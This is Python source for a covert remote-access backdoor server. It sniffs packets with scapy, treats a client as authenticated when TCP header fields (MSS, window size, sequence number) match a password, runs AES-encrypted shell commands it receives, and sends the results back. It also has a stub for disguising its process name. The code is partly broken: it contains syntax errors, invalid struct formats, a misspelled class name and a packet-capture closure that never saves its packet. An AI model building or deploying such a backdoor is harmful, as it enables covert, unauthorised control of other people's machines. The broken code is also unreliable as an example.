from __future__ import print_function
from scapy.all import *

import command
import Crypto.Cipher
import struct
import time

class BackdoorServer(object):

    def __init__(self, procname, aeskey, password):
        self.procname = procname
        self.aeskey = aeskey
        self.password = password

    def mask_process(self):
        # TODO change process name according to config file
        pass

    def recv(self):
        raise NotImplementedError

    def send(self, buf):
        raise NotImplementedError

    def listen(self):
        raise NotImplementedError

    def recv_command(self):
        # Continue looping until we get a command
        # Ignore any packets that can't be decrypted or don't have the password in them
        while True:
            buf = self.recv()
            if len(buf) < 16:
                continue

            iv = buf[0:16]
            decryptor = Crypto.Cipher.AES.new(self.aeskey, Crypto.Cipher.AES.MODE_CBC, iv)

            try:
                decrypted = decryptor.decrypt(buf[16:])
            except Exception, err:
                print(str(err))
                continue

            if decrypted[16:26] == self.password:
                cmdbytes = buf[26:]

                if cmdbytes[0] == command.Command.SHELL:
                    cmd = command.ShellComand.from_bytes(cmdbytes)
                elif cmdbytes[0] == command.Command.WATCH:
                    cmd = command.WatchCommand.from_bytes(cmdbytes)
                elif cmdbytes[0] == command.Command.END:
                    cmd = None
                else:
                    raise ValueError("Unknown command type {}".format(cmdbytes[0]))

                return cmd


    def send_result(self, result):
        payload = result.to_bytes()
        timestamp = time.time()

        # create a 16-byte initialisation vector
        # for the forseeable future, timestamp is representable in 4 bytes
        iv = struct.pack(">I>I>I>I", timestamp, timestamp, timestamp, timestamp)

        encryptor = Crypto.Cipher.AES.new(self.aeskey, Crypto.Cipher.AES.MODE_CBC, iv)
        payload = encryptor.encrypt(payload)
        payload = iv + payload
        self.send(payload)

    def run(self):
        self.mask_process()
        while True:
            self.listen()
            while True:
                try:
                    cmd = self.recv_command()
                    if not cmd:
                        break

                    result = cmd.run()
                    self.send_result(result)

                except Exception, err:
                    print(str(err))
                    break

class TcpBackdoorServer(BackdoorServer):

    def __init__(self, procname, aeskey, password, listenport, clientport):
        super(TcpBackdoorServer, self).__init__(procname, aeskey, password)
        self.listenport = listenport
        self.clientport = clientport

    def listen(self):
        # If MSS option + window size + ISN == the password and the traffic is bound for the correct port, we have a client

        self.client = None
        def is_auth(packet):
            if len(packet["TCP"].options) == 0:
                return False

            mss = next((v for i, v in enumerate(packet["TCP"].options) if v[0] == "MSS"), None)
            if not mss:
                return False

            mss = mss[1] # Get the actual MSS value from the tuple

            window = packet["TCP"].window
            isn = packet["TCP"].seq

            pw = struct.pack(">H>H>I", mss, window, isn)
            if pw == self.password:
                self.client = packet.src
                return True
            else:
                return False

        bpf_filter = "tcp dst port {}".format(self.listenport)
        sniff(filter=bpf_filter, stop_filter=is_auth)

    def recv(self):
        p = None
        def save_packet(packet):
            p = packet

        bpf_filter = "tcp dst port {} src {}".format(self.listenport, inet_ntoa(self.client)))
        sniff(filter=bpf_filter, prn=save_packet, stop_filter=lambda packet: return True)

        return p.payload
